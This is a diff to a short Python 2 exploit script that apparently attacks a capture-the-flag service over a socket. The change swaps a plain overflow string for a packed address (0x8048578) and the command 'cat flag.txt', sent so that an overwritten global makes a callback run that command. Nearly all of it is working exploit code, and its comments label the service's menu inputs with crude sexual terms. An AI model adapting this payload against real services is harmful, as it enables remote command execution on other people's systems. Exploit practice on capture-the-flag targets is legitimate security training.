@@ -1,4 +1,4 @@
-import socket, sys
+import socket, sys, struct
 
 if len(sys.argv) != 3:
     print 'Usage: %s <ip> <command>' % sys.argv[0]
@@ -17,7 +17,8 @@ print s.recv(2048)
 # wonder bra breasts -> allocate and write string (overwriting global info)
 s.send('(oYo)\n')
 print s.recv(2048)
-s.send('A' * 131 + '\n')
+x = struct.pack('I', 0x8048578) + 'cat flag.txt'
+s.send('%s\x00%s\n' % (x, 'A' * (131 + len(x))))
 
 # pornstar breasts -> execute callback
 s.send('($)($)\n')
